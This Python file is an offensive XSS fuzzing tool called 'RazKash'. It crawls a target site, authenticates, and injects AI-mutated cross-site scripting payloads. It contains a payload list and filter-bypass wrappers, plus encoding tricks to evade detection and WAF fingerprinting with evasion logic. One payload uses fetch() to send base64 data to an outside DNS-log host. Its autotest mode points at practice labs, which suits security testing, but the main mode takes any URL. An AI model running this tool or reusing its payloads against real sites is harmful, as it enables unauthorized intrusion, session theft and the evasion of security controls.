#!/usr/bin/env python3
# =============================================================================
# RazKash 𝕏SS AI Fuzzer (v9.1-omni-enterprise, 2025-05-04)
# Author : Haroon Ahmad Awan · CyberZeus (mrharoonawan@gmail.com)
# =============================================================================

import os
import re
import ssl
import sys
import json
import time
import random
import string
import argparse
import warnings
import logging
import base64
import threading
import contextlib
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import List, Dict, Any
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor

import urllib.parse
import requests
from requests.adapters import HTTPAdapter
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

import torch
from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log

# Optional Playwright & websocket-client
try:
    from playwright.sync_api import sync_playwright, Request as PWReq, WebSocket as PWWS, Response as PWResp, Page
except ImportError:
    sync_playwright = None
try:
    import websocket
except ImportError:
    websocket = None

# ─── CONFIG ────────────────────────────────────────────────────────────────
VER              = "9.1-omni-enterprise"
MODEL            = "microsoft/codebert-base"
DNSLOG_DOMAIN    = "ugxllx.dnslog.cn"
LOGFILE          = Path("razkash_findings.md")

TOP_K            = 7
DEF_THREADS      = 16
MAX_STATIC_PAGES = 300
MAX_NESTED_DEPTH = 5
SPA_WAIT_MS      = 2000
DYN_OBS_MS       = 20000
RESCAN_MS        = 600
MAX_DYN_ROUNDS   = 80
HTTP_TIMEOUT     = 12
VERIFY_TIMEOUT   = 9000
HEADLESS_WAIT    = 3500

# ─── ARGS & LOGGING ────────────────────────────────────────────────────────
ap = argparse.ArgumentParser(
    description="RazKash v9.1-omni-enterprise · Ultimate AI XSS Omnifuzzer"
)
ap.add_argument("-u", "--url",         help="Target root URL")
ap.add_argument("--autotest",          action="store_true", help="Run built-in vulnerable labs")
ap.add_argument("--login-url",         help="URL to submit login credentials")
ap.add_argument("--username",          help="Username for login")
ap.add_argument("--password",          help="Password for login")
ap.add_argument("--csrf-field",        default="csrf", help="CSRF form field name")
ap.add_argument("--threads",           type=int, default=DEF_THREADS)
ap.add_argument("--max-pages",         type=int, default=MAX_STATIC_PAGES)
ap.add_argument("--nested-depth",      type=int, default=MAX_NESTED_DEPTH)
ap.add_argument("--simulate-spa",      action="store_true", help="Click internal SPA links")
ap.add_argument("--crawl-iframes",     action="store_true", help="Enter iframes and nested pages")
ap.add_argument("--detect-waf",        action="store_true", help="Enable passive WAF fingerprinting")
ap.add_argument("--polymorph",         action="store_true", help="Enable polymorphic traffic")
ap.add_argument("--headed",            action="store_true", help="Launch browser non-headless to view alerts")
ap.add_argument("--debug",             action="store_true", help="Enable debug logging")
args = ap.parse_args()
DEBUG = args.debug

logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s" if DEBUG else "%(message)s"
)
warnings.filterwarnings("ignore")
hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"] = "1"
ssl._create_default_https_context = ssl._create_unverified_context

def dbg(msg: str):
    if DEBUG:
        logging.debug(msg)

# ─── UTILITIES ─────────────────────────────────────────────────────────────
randstr = lambda n=12: ''.join(random.choices(string.ascii_letters+string.digits, k=n))
def jitter(a: float, b: float):
    time.sleep(random.uniform(a, b))

def smart_url(raw: str) -> str:
    if raw.startswith(("http://","https://")):
        return raw
    for s in ("https://","http://"):
        with contextlib.suppress(Exception):
            r = requests.head(s+raw, timeout=5, allow_redirects=True, verify=False)
            if r.status_code < 500:
                return s+raw
    return "http://"+raw

def random_headers() -> Dict[str, str]:
    ua = UserAgent()
    h = {
        "User-Agent": ua.random,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive"
    }
    if args.polymorph:
        h = dict(sorted(h.items(), key=lambda _: random.random()))
        h["X-Random"] = randstr(8)
    return h

# ─── AUTHENTICATION / SESSION ──────────────────────────────────────────────
def get_authenticated_session() -> requests.Session:
    sess = requests.Session()
    if args.login_url and args.username and args.password:
        # detect Juice Shop REST login endpoint
        if args.login_url.rstrip("/").endswith("/rest/user/login"):
            headers = random_headers()
            headers["Content-Type"] = "application/json"
            resp = sess.post(
                args.login_url,
                json={"email": args.username, "password": args.password},
                headers=headers,
                verify=False,
                timeout=HTTP_TIMEOUT
            )
            dbg(f"[login] status={resp.status_code} body={resp.text}")
            try:
                j = resp.json()
                token = j.get("authentication", {}).get("token") or j.get("token")
                if token:
                    sess.headers.update({"Authorization": f"Bearer {token}"})
                    dbg(f"[login] using token={token[:8]}…")
            except Exception as e:
                dbg(f"[login] token parse error: {e}")
        else:
            # fallback to form-based login
            r = sess.get(args.login_url, headers=random_headers(), verify=False, timeout=HTTP_TIMEOUT)
            data = {}
            if args.csrf_field in r.text:
                m = re.search(f'name=\"{args.csrf_field}\" value=\"([^\"]+)\"', r.text)
                if m:
                    data[args.csrf_field] = m.group(1)
            data.update({"username": args.username, "password": args.password})
            sess.post(
                args.login_url,
                data=data,
                headers=random_headers(),
                verify=False,
                timeout=HTTP_TIMEOUT
            )
            dbg(f"[login] session cookies: {sess.cookies.get_dict()}")
    return sess

# create session and mount adapter to enlarge pool
SESSION = get_authenticated_session()
adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)
SESSION.mount("https://", adapter)
SESSION.mount("http://", adapter)


# ─── AI MUTATION & POLYMORPH ────────────────────────────────────────────────
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
tok    = AutoTokenizer.from_pretrained(MODEL)
mdl    = AutoModelForMaskedLM.from_pretrained(MODEL).to(device).eval()
MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id

def ai_mutate(s: str) -> str:
    while "MASK" in s:
        ids = tok(s.replace("MASK", MASK_T, 1), return_tensors="pt").input_ids.to(device)
        with torch.no_grad():
            logits = mdl(input_ids=ids).logits
        pos = (ids == MASK_ID).nonzero(as_tuple=True)[1][0]
        token_id = random.choice(logits[0, pos].topk(TOP_K).indices.tolist())
        w = tok.decode(token_id).strip() or "alert(1)"
        s = s.replace("MASK", w, 1)
    return s

def polymorph(s: str) -> str:
    typ = random.choice(["hex","uni","url","b64","comment","bidi","none"])
    if typ == "hex":
        return ''.join(f"\\x{ord(c):02x}" for c in s)
    if typ == "uni":
        return ''.join(f"\\u{ord(c):04x}" for c in s)
    if typ == "url":
        return urllib.parse.quote(s)
    if typ == "b64":
        return base64.b64encode(s.encode()).decode()
    if typ == "comment":
        return ''.join(f"{c}/**/" for c in s)
    if typ == "bidi":
        return "\u202E" + s[::-1]
    return s

def legit_wrap(s: str) -> str:
    wrappers = [
        "<div hidden>PAYLOAD</div>",
        "<span style=display:none>PAYLOAD</span>",
        "<p data-x=PAYLOAD></p>",
        "<video srcdoc='<script>PAYLOAD</script>'></video>",
        "<template id=tpl>PAYLOAD</template><script>document.body.append(tpl.content)</script>",
        "<noscript><style>*{background:url(javascript:PAYLOAD)}</style></noscript>"
    ]
    return random.choice(wrappers).replace("PAYLOAD", s)

def reflected(marker: str, html: str) -> bool:
    low = html.lower()
    return marker.lower() in low or SequenceMatcher(None, marker.lower(), low).quick_ratio() > 0.8

# ─── PAYLOAD & FILTER SETS ─────────────────────────────────────────────────
PAY = [
    "<script>MASK</script>",
    "<img src=x onerror='MASK'>",
    "<svg><script>MASK</script></svg>",
    "<iframe srcdoc='<script>MASK</script>'></iframe>",
    "<body onload=MASK>",
    "<details ontoggle=MASK>",
    '{"@context":"http://schema.org","@type":"Person","name":"MASK"}',
    '{"@context":"http://schema.org","@type":"Product","description":"MASK"}',
    "<span property='schema:name'>MASK</span>",
    "<div typeof='schema:Product' about='#x'><span property='description'>MASK</span></div>",
    "<meta property='og:title' content='MASK'>",
    "<script>trustedTypes.createPolicy('x',{createHTML:s=>s}).createHTML('MASK')</script>",
    "<meta http-equiv='Content-Security-Policy' content=\"script-src 'self' 'nonce-MASK'\"><script nonce='MASK'>MASK</script>",
    "/**/<script>MASK</script>/**/",
    "<!--<script>--><script>MASK</script>//-->",
    "<div><p><style><img src=x onerror=MASK>",
    "{{constructor.constructor('MASK')()}}",
    "{{#with 's' as |x|}}{{x.constructor('MASK')()}}{{/with}}",
    "<div v-html=\"MASK\"></div>",
    "<component :is=\"'script'\" src='x.js'></component>",
    "<script>WebAssembly.instantiateStreaming(fetch('data:application/wasm;base64,MASK'))</script>",
    "<script>navigator.serviceWorker.register('sw.js?x=MASK')</script>",
    "<script>navigator.gpu.requestAdapter().then(a=>MASK)</script>",
    "<script>new BroadcastChannel('x').postMessage('MASK')</script>",
    "<script>new EventSource('/stream?x=MASK')</script>",
    "<script>caches.open('x').then(c=>c.put('/pwned',new Response('<script>MASK</script>')))</script>",
    "\ufeff\u202Egpj.sj//:ptth<script>MASK</script>",
    "<script>__proto__.x=MASK</script>",
    "<script>Object.defineProperty({},'__proto__',{value:{innerHTML:'<img src onerror=MASK>'}})</script>"
]
if DNSLOG_DOMAIN:
    PAY.append(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa('MASK'))>")

FILTER = [
    "<sCrIpT>PAYLOAD</sCrIpT>",
    "<!-->PAYLOAD<!-->",
    "<object data=\"javascript:PAYLOAD\"></object>",
    "<meta http-equiv=refresh content=\"0;url=javascript:PAYLOAD\">",
    "<div style=width:expression(PAYLOAD)></div>"
]

# ─── JSFLAG: In-browser sink tracer ─────────────────────────────────────────
JSFLAG = """
window._xss_triggered=false;function _f(){window._xss_triggered=true;}
['innerHTML','outerHTML','insertAdjacentHTML','appendChild','after','before'].forEach(p=>{
 const d=Object.getOwnPropertyDescriptor(Element.prototype,p)||{};
 if(d.set){Object.defineProperty(Element.prototype,p,{set(v){_f();d.set.call(this,v)},configurable:true});}
});
const _eval=window.eval;window.eval=function(...a){_f();return _eval(...a)};
const _F=Function;window.Function=function(...a){_f();return new _F(...a)};
MutationObserver.prototype.observe=new Proxy(MutationObserver.prototype.observe,{
 apply(t,s,a){_f();return Reflect.apply(t,s,a);}
});
"""

# ─── WAF DETECTION & EVASION ───────────────────────────────────────────────
def detect_waf(url: str) -> str:
    sigs = {
        "cloudflare":   ["__cf_bm","Attention Required!","Cloudflare Ray ID","cf-ray","cf-cache-status"],
        "akamai":       ["akamai","AKAMAI","akamaiedge","AkamaiGHost","EdgePrerender"],
        "imperva":      ["incapsula","X-Iinfo","visid_incap_","incap_ses_"],
        "sucuri":       ["Access Denied - Sucuri","sucuri_cloudproxy_uuid","CloudProxy-Signature"],
        "mod_security": ["Mod_Security","mod_security","OWASP_CRS","SecRuleEngine"],
        "aws_waf":      ["AWSALB","AmazonALB","X-Amzn-RequestId","X-Amzn-Debug"],
        # ... add your other 50+ providers here using the same pattern ...
    }
    try:
        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        text = r.text.lower()
        for name, patterns in sigs.items():
            if any(pat.lower() in text for pat in patterns):
                return name
    except:
        pass
    return "unknown"

# ─── LOGGING & HIT CAPTURE ─────────────────────────────────────────────────
if not LOGFILE.exists():
    LOGFILE.write_text(f"# RazKash Findings v{VER}\n\n", "utf-8")
_hits = set()
log_lock = threading.Lock()

def log_hit(url: str, method: str, payload: str):
    entry = f"- **XSS** {method} `{url}` payload=`{payload[:90]}`\n"
    with log_lock:
        if entry in _hits:
            return
        _hits.add(entry)
        LOGFILE.write_text(LOGFILE.read_text("utf-8") + entry, "utf-8")
    logging.info(entry.strip())

# ─── VERIFICATION ─────────────────────────────────────────────────────────
def verify(url: str, method: str, data: Any, is_json: bool=False) -> bool:
    if not sync_playwright:
        dbg("[verify] Playwright not available")
        return False
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=not args.headed,
                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
            )
            ctx = browser.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
            ctx.add_init_script(JSFLAG)
            page = ctx.new_page()
            page.on("dialog", lambda d: (
                d.accept() if args.headed else d.dismiss(),
                page.evaluate("_f()")
            ))
            if method.upper() == "GET":
                page.goto(f"{url}?{urllib.parse.urlencode(data)}", timeout=VERIFY_TIMEOUT, wait_until="networkidle")
            else:
                hdr = {"Content-Type":"application/json"} if is_json else {"Content-Type":"application/x-www-form-urlencoded"}
                body = json.dumps(data) if is_json else urllib.parse.urlencode(data)
                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
                page.evaluate("(u,h,b)=>fetch(u,{method:'POST',headers:h,body:b})", url, hdr, body)
            page.wait_for_timeout(HEADLESS_WAIT)
            triggered = page.evaluate("window._xss_triggered")
            if args.headed and triggered:
                print(f"⚡ XSS popup at {url}")
                page.wait_for_timeout(30_000)
            ctx.close()
            browser.close()
            return bool(triggered)
    except Exception as e:
        dbg(f"[verify] {e}")
        return False

# ─── SEMANTIC INJECTION DISCOVERY ──────────────────────────────────────────
def deep_keys(o: Any, prefix: str="") -> List[str]:
    keys = []
    if isinstance(o, dict):
        for k, v in o.items():
            p = f"{prefix}.{k}" if prefix else k
            if isinstance(v, (dict, list)):
                keys += deep_keys(v, p)
            else:
                keys.append(p)
    elif isinstance(o, list):
        for i, v in enumerate(o):
            p = f"{prefix}[{i}]"
            if isinstance(v, (dict, list)):
                keys += deep_keys(v, p)
            else:
                keys.append(p)
    return keys

def set_deep(o: Any, path: str, val: Any):
    parts = [seg for seg in re.split(r'\.|\[|\]', path) if seg]
    cur = o
    for seg in parts[:-1]:
        if seg.isdigit():
            continue
        cur = cur.setdefault(seg, {})
    leaf = parts[-1]
    if not leaf.isdigit():
        cur[leaf] = val

def extract_semantic_targets(html: str, base: str) -> List[Dict[str, Any]]:
    soup = BeautifulSoup(html, "html.parser")
    results = []
    # JSON-LD
    for scr in soup.find_all("script", {"type":"application/ld+json"}):
        try:
            j = json.loads(scr.string or "")
            paths = deep_keys(j)
            for p in paths:
                results.append({"url": base, "method":"POST", "json":True, "template":j, "params":[p]})
        except:
            pass
    # RDFa/Microdata
    for tag in soup.find_all(attrs={"property":True}):
        prop = tag.get("property")
        if prop:
            results.append({"url": base, "method":"GET", "params":[prop]})
    for tag in soup.find_all(attrs={"itemprop":True}):
        ip = tag.get("itemprop")
        if ip:
            results.append({"url": base, "method":"GET", "params":[ip]})
    # AngularJS interpolation
    for m in re.findall(r"\{\{(.+?)\}\}", html):
        results.append({"url": base, "method":"GET", "params":[m.strip()]})
    return results

# ─── JS MINING & ASSET DISCOVERY ───────────────────────────────────────────
import re

# match JS calls like fetch('/foo.aspx?x=1'), axios.get("/bar.ashx"), XHR.open('GET','/baz.aspx')
JS_CALL_RE = re.compile(r"""
    (?:                                       # any of:
        fetch\(\s*['"]                       #   fetch('...
      | axios\.(?:get|post|put|delete|patch) #   axios.get|post|...
        \(\s*['"]
      | XHR\.open\(\s*['"](GET|POST)['"],\s* #   XHR.open('GET','...
    )
    (
      /[^'"]+                                # path must start with slash
      \.(?:js|php|asp|aspx|html|htm|ashx|asmx|jsp      # file extensions to catch
         |json|api|graphql|cgi)
      (?:\?[^'"]*)?                          # optional query string
    )
    ['"]                                     # closing quote
""", re.IGNORECASE | re.VERBOSE)

# match any literal URL in JS strings: "/foo.aspx", '/bar.php?x=1'
JS_URL_RE = re.compile(r"""
    ['"]                                    # opening quote
    (
      /[^'"]+                               # leading slash + path
      \.(?:js|php|asp|aspx|html|htm|ashx|asmx|jsp     # same extensions
         |json|api|graphql|cgi)
      (?:\?[^'"]*)?                         # optional query string
    )
    ['"]                                    # closing quote
""", re.IGNORECASE | re.VERBOSE)

def mine_js(url: str, host: str) -> List[str]:
    found = []
    try:
        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        txt = r.text
        found += JS_CALL_RE.findall(txt)
        found += [m for m in JS_URL_RE.findall(txt)]
        if url.endswith(".js") and "sourceMappingURL" in txt:
            sm = url.rsplit("/", 1)[0] + "/" + txt.split("sourceMappingURL=")[-1].split("\n")[0].strip()
            found += mine_js(sm, host)
    except Exception as e:
        dbg(f"[mine_js] {e}")
    out = set()
    for u in found:
        full = urllib.parse.urljoin(url, u)
        if urllib.parse.urlparse(full).netloc.lower() == host:
            out.add(full)
    return list(out)

def misc_assets(root: str) -> List[str]:
    base = urllib.parse.urlparse(root)._replace(path="", query="", fragment="").geturl()
    assets = []
    try:
        txt = SESSION.get(base+"/robots.txt", headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
        for line in txt.splitlines():
            if line.lower().startswith("sitemap:"):
                assets.append(line.split(":",1)[1].strip())
        for sm in assets.copy():
            with contextlib.suppress(Exception):
                xml = SESSION.get(sm, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
                tree = ET.fromstring(xml)
                for loc in tree.iter("{*}loc"):
                    assets.append(loc.text.strip())
    except Exception as e:
        dbg(f"[misc_assets] {e}")
    for path in ("/manifest.json","/ngsw.json"):
        with contextlib.suppress(Exception):
            data = SESSION.get(base+path, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
            j = json.loads(data)
            for key in ("assets","files"):
                for v in j.get(key, []):
                    assets.append(base+v if v.startswith("/") else v)
    return list(set(assets))

# ─── STATIC CRAWLER ─────────────────────────────────────────────────────────
def crawl_static(root: str, cap: int, depth: int=0) -> List[Dict[str,Any]]:
    visited = set()
    queue = [(root,0)] + [(u,0) for u in misc_assets(root)]
    targets = []
    host = urllib.parse.urlparse(root).netloc.lower()
    logging.info(f"[static] crawling {root} (≤{cap} pages, depth={depth})")
    while queue and len(visited) < cap:
        u, d = queue.pop(0)
        if u in visited:
            continue
        visited.add(u)
        try:
            r = SESSION.get(u, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        except Exception as e:
            dbg(f"[static] {u} err: {e}")
            continue
        c = r.headers.get("Content-Type", "")
        if "javascript" in c:
            for js in mine_js(u, host):
                if js not in visited:
                    queue.append((js, d))
            continue
        if "html" not in c:
            continue
        soup = BeautifulSoup(r.text, "html.parser")
        if args.crawl_iframes and d < args.nested_depth:
            for iframe in soup.find_all("iframe", src=True):
                src = urllib.parse.urljoin(u, iframe["src"])
                if urllib.parse.urlparse(src).netloc.lower() == host:
                    queue.append((src, d+1))
        for tag in soup.find_all("script", src=True):
            src = urllib.parse.urljoin(u, tag["src"])
            if urllib.parse.urlparse(src).netloc.lower() == host:
                queue.append((src, d))
        for a in soup.find_all("a", href=True):
            nxt = urllib.parse.urljoin(u, a["href"])
            p = urllib.parse.urlparse(nxt)
            if p.netloc.lower() != host:
                continue
            if nxt not in visited:
                queue.append((nxt, d))
            if p.query:
                qs = list(urllib.parse.parse_qs(p.query).keys())
                targets.append({"url": p._replace(query="").geturl(), "method":"GET", "params":qs})
        for f in soup.find_all("form"):
            act = urllib.parse.urljoin(u, f.get("action") or u)
            if urllib.parse.urlparse(act).netloc.lower() != host:
                continue
            mth = f.get("method", "get").upper()
            params = [i.get("name") for i in f.find_all(["input","textarea","select"]) if i.get("name")]
            if params:
                targets.append({"url": act, "method": mth, "params": params})
        for btn in soup.find_all("button"):
            name = btn.get("name")
            fa = btn.get("formaction")
            mth = btn.get("formmethod", "post").upper()
            url2 = urllib.parse.urljoin(u, fa) if fa else u
            if name:
                targets.append({"url": url2, "method": mth, "params":[name]})
        targets += extract_semantic_targets(r.text, u)
        jitter(0.3, 0.9)
    logging.info(f"[static] discovered {len(targets)} endpoints")
    return targets

# ─── DYNAMIC CRAWLER ───────────────────────────────────────────────────────
def crawl_dynamic(root: str) -> List[Dict[str,Any]]:
    if not sync_playwright:
        logging.info("[dynamic] skipping—Playwright unavailable")
        return []
    host = urllib.parse.urlparse(root).netloc.lower()
    found = []
    seen = set()
    logging.info(f"[dynamic] launching Playwright for {root}")
    try:
        with sync_playwright() as p:
            br = p.chromium.launch(headless=not args.headed, args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
            ctx = br.new_context(ignore_https_errors=True, user_agent=UserAgent().random, service_workers="allow")
            page = ctx.new_page()
            def on_req(req: PWReq):
                u = req.url
                if urllib.parse.urlparse(u).netloc.lower() != host or u in seen:
                    return
                seen.add(u)
                mth = req.method.upper()
                hdr = req.headers.get("content-type","")
                is_json = "json" in hdr or "graph" in hdr
                tpl, keys = None, []
                if is_json and req.post_data:
                    with contextlib.suppress(Exception):
                        j = json.loads(req.post_data)
                        tpl = j.get("variables", j) if isinstance(j, dict) else {}
                        keys = deep_keys(tpl)
                qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query).keys())
                params = keys or qs or ["data"]
                found.append({
                    "url": u.split("?",1)[0],
                    "method": mth if mth in {"POST","PUT"} else "GET",
                    "params": params,
                    "json": bool(keys),
                    "template": tpl
                })
            page.on("request", on_req)
            if args.crawl_iframes:
                page.on("frameattached", lambda f: f.on("request", on_req))
            for c in SESSION.cookies:
                page.context.add_cookies([{"name":c.name, "value":c.value, "domain":c.domain, "path":c.path}])
            page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
            if args.simulate_spa:
                for a in page.query_selector_all("a[href]"):
                    with contextlib.suppress(Exception):
                        a.click(); page.wait_for_timeout(SPA_WAIT_MS)
            for b in page.query_selector_all("button, input[type=submit]"):
                with contextlib.suppress(Exception):
                    b.click(); page.wait_for_timeout(SPA_WAIT_MS)
            def dom_forms():
                forms = page.evaluate("""() => Array.from(document.forms).map(f=>({
                    action: f.action||location.href,
                    method: (f.method||'get').toUpperCase(),
                    params: Array.from(f.querySelectorAll('input[name],textarea[name],select[name]')).map(i=>i.name)
                }))""")
                for f in forms:
                    a = f["action"]
                    if urllib.parse.urlparse(a).netloc.lower() != host or not f["params"]:
                        continue
                    found.append({"url": a, "method": f["method"], "params": f["params"]})
            dom_forms()
            start = time.time()*1000
            rounds = 0
            while (time.time()*1000 - start) < DYN_OBS_MS and rounds < MAX_DYN_ROUNDS:
                with contextlib.suppress(Exception):
                    page.wait_for_timeout(RESCAN_MS)
                dom_forms()
                rounds += 1
            ctx.close(); br.close()
    except Exception as e:
        dbg(f"[dynamic] {e}")
    logging.info(f"[dynamic] discovered {len(found)} endpoints")
    return found

# ─── FUZZING ENGINES ───────────────────────────────────────────────────────
def fuzz_http(t: Dict[str,Any]) -> None:
    url    = t["url"]
    method = t["method"]
    is_json = t.get("json", False)
    tpl    = t.get("template")
    marker = randstr()
    try:
        if is_json and tpl:
            body = json.loads(json.dumps(tpl))
            set_deep(body, random.choice(t["params"]), marker)
            resp = SESSION.post(url, headers={"Content-Type":"application/json"}, data=json.dumps(body),
                                timeout=HTTP_TIMEOUT, verify=False)
        else:
            probe = {p: marker for p in t["params"]}
            resp = (SESSION.get if method=="GET" else SESSION.post)(
                url,
                params=probe if method=="GET" else None,
                data=probe if method=="POST" else None,
                headers=random_headers(),
                timeout=HTTP_TIMEOUT, verify=False
            )
        if resp.status_code!=200 or not reflected(marker, resp.text):
            return
    except Exception as e:
        dbg(f"[probe] {e}")
        return

    for sk in random.sample(PAY, k=min(32, len(PAY))):
        core = ai_mutate(sk)
        variants = {core, polymorph(core), legit_wrap(core)}
        for filt in FILTER:
            variants.add(filt.replace("PAYLOAD", core))
        if DNSLOG_DOMAIN:
            variants.add(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa('{urllib.parse.quote(core)}'))>")
        for pay in variants:
            try:
                if is_json and tpl:
                    body = json.loads(json.dumps(tpl))
                    for p in t["params"]:
                        set_deep(body, p, pay)
                    r2 = SESSION.post(url, headers={"Content-Type":"application/json"},
                                     data=json.dumps(body), timeout=HTTP_TIMEOUT, verify=False)
                else:
                    dat = {p: pay for p in t["params"]}
                    r2 = (SESSION.get if method=="GET" else SESSION.post)(
                        url,
                        params=dat if method=="GET" else None,
                        data=dat if method=="POST" else None,
                        headers=random_headers(),
                        timeout=HTTP_TIMEOUT, verify=False
                    )
                txt = r2.text.lower()
                if r2.status_code in {403,429,503} or any(w in txt for w in ("captcha","access denied","blocked")):
                    dbg(f"[waf block] {url}")
                    jitter(10, 30)
                    return
                if reflected(pay, r2.text) or verify(url, method, dat if not is_json else body, is_json):
                    log_hit(url, method, pay)
                    return
            except Exception as e:
                dbg(f"[fuzz] {e}")
            jitter(0.6, 2.0)

def fuzz_ws(t: Dict[str,Any]) -> None:
    if not websocket:
        return
    url    = t["url"]
    params = t.get("params", [])
    tpl    = t.get("template") or {}
    marker = randstr()
    body = json.loads(json.dumps(tpl)) if tpl else {}
    if body:
        set_deep(body, random.choice(params), f"<img src onerror=alert('{marker}')>")
    else:
        body[random.choice(params)] = f"<svg/onload=alert('{marker}')>"
    payload = json.dumps(body)
    hit = False
    def on_msg(ws, msg):
        nonlocal hit
        if marker in msg:
            hit = True
    try:
        wsapp = websocket.WebSocketApp(url, on_message=on_msg)
        thr = threading.Thread(target=wsapp.run_forever, kwargs={"sslopt":{"cert_reqs":ssl.CERT_NONE}})
        thr.daemon = True
        thr.start()
        time.sleep(1)
        wsapp.send(payload)
        time.sleep(3)
        wsapp.close()
        if hit:
            log_hit(url, "WS", payload)
    except Exception as e:
        dbg(f"[ws fuzz] {e}")

# ─── MAIN DRIVER ────────────────────────────────────────────────────────────
AUTOTEST=[
    "http://xss-game.appspot.com/",
    "http://xss-game.appspot.com/level1",
    "https://juice-shop.herokuapp.com/"
]

def main() -> None:
    roots = []
    if args.autotest:
        roots = [smart_url(u) for u in AUTOTEST]
    elif args.url:
        roots = [smart_url(args.url.rstrip("/"))]
    else:
        ap.print_help()
        sys.exit(1)

    logging.info(f"\n┌─ RazKash AI XSS v{VER}")
    if args.detect_waf:
        for r in roots:
            waf = detect_waf(r)
            logging.info(f"│   WAF detected on {r}: {waf}")
    for root in roots:
        logging.info(f"├─▶ {root}")
        static_targets  = crawl_static(root, args.max_pages, depth=1)
        dynamic_targets = crawl_dynamic(root)
        # stored XSS simulation
        for t in list(static_targets):
            if t["method"] in ("POST","PUT") and not t.get("json"):
                m = randstr()
                SESSION.post(t["url"], data={p:m for p in t["params"]},
                             headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
                if verify(t["url"], "GET", {p:m for p in t["params"]}, False):
                    log_hit(t["url"], "STORED", m)
        targets = static_targets + dynamic_targets
        http_targets = [t for t in targets if t["method"] != "WS"]
        ws_targets   = [t for t in targets if t["method"] == "WS"]
        logging.info(f"│   HTTP targets: {len(http_targets)}   WS targets: {len(ws_targets)}")
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            pool.map(fuzz_http, http_targets)
            pool.map(fuzz_ws,   ws_targets)
        logging.info("│   ✓ fuzzing complete\n")
    logging.info(f"└─ Findings saved to {LOGFILE.resolve()}\n")

if __name__ == "__main__":
    main()

# ─── CLI USAGE HELP ─────────────────────────────────────────────────────────
"""
Examples:
  python razkash.py -u https://target.site --crawl-iframes --simulate-spa --detect-waf --polymorph --threads 16
"""
